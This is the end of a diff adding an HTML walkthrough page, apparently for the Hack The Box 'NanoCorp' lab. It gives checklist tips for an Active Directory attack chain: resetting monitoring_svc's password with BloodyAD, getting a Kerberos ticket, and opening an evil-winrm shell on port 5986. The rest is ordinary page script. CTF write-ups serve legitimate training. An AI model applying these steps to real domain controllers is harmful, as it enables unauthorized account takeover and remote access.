+              <strong>✓ /etc/hosts has dc01.nanocorp.htb pointing to TARGET_IP</strong>
+              Kerberos resolves KDCs by hostname, not IP. Missing this = "Cannot contact KDC" error.
+            </div>
+            <div class="info-box info-green">
+              <strong>✓ Realm name is UPPERCASE in all commands: NANOCORP.HTB</strong>
+              Case-sensitive. NANOCORP.HTB ≠ nanocorp.htb in kinit and evil-winrm -r.
+            </div>
+            <div class="info-box info-green">
+              <strong>✓ System time synced with DC before kinit</strong>
+              5-minute tolerance. HTB DC01 has ~7h skew from default Kali. Sync first.
+            </div>
+            <div class="info-box info-gold">
+              <strong>✓ Do kinit IMMEDIATELY after BloodyAD password change</strong>
+              The lab resets monitoring_svc's password on Evil-WinRM auth failure. Get the TGT before attempting any WinRM connection.
+            </div>
+            <div class="info-box info-gold">
+              <strong>✓ Use -K (ticket path) with evil-winrm, NOT -p (password)</strong>
+              Password auth triggers the lab reset. Ticket auth doesn't. This is the key difference.
+            </div>
+            <div class="info-box info-purple">
+              <strong>✓ Port 5986 with -S flag — non-standard SSL WinRM</strong>
+              Default evil-winrm uses 5985. This DC uses 5986 with SSL. Missing -S or -P 5986 = connection timeout.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<script>
+function navTo(id, el) {
+  document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  el.classList.add('active');
+}
+
+// Copy buttons
+document.querySelectorAll('.cmd-code').forEach(block => {
+  const label = block.previousElementSibling;
+  if (!label || !label.classList.contains('cmd-label')) return;
+  const btn = label.querySelector('.copy-btn');
+  if (!btn) return;
+  btn.onclick = () => {
+    const text = block.innerText.replace(/\u00a0/g, ' ');
+    navigator.clipboard.writeText(text.trim()).then(() => {
+      btn.textContent = 'copied!';
+      btn.style.color = 'var(--accent3)';
+      setTimeout(() => { btn.textContent = 'copy'; btn.style.color = ''; }, 1800);
+    });
+  };
+});
+
+// Scroll spy
+const mainEl = document.getElementById('mainContent');
+const sections = document.querySelectorAll('.section');
+mainEl.addEventListener('scroll', () => {
+  let current = '';
+  sections.forEach(s => {
+    if (s.offsetTop - mainEl.scrollTop < 160) current = s.id;
+  });
+  document.querySelectorAll('.nav-item').forEach(n => {
+    const oc = n.getAttribute('onclick') || '';
+    const m = oc.match(/'(s\d+)'/);
+    if (m) n.classList.toggle('active', m[1] === current);
+  });
+});
+
+// Attack path node hover glow
+document.querySelectorAll('.ap-node').forEach(node => {
+  node.addEventListener('mouseenter', () => {
+    node.style.transform = 'translateY(-2px)';
+    node.style.transition = 'transform 0.15s';
+  });
+  node.addEventListener('mouseleave', () => {
+    node.style.transform = '';
+  });
+});
+</script>
+</body>
+</html>
